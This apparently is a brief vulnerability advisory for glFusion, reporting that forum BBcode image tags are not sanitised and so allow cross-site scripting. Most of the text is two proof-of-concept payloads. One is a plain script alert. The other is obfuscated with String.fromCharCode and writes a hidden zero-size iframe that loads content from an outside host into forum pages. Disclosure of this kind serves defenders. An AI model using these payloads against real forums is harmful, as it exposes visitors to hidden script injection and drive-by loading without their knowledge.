Info:
*
glFusion <http://www.glfusion.org/>* gives you the ability to easily create
websites and online communities complete with add-ons like Forums,
CAPTCHA/Spam filters, Calendars, File & Media Gallery management solutions,
WYSIWYG editors, and MooTools AJAX support, all right out of the box.


Details:

Failure to sanitize the BBcode image tags in the forum posts allows attacker
to perform XSS attacks. also noted that u can't inject any "src" attribute
in the attack so we use the second POC.


POC:

[img w=30><script>alert(123);</script> h=30]images/help.png[/img]

[img
w=30><script>document.write(String.fromCharCode(60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,50,51,49,46,49,50,56,58,56,48,56,48,47,34,32,104,101,105,103,104,116,61,34,48,34,32,119,105,100,116,104,61,34,48,34,62));</script>
h=30]x[/img]
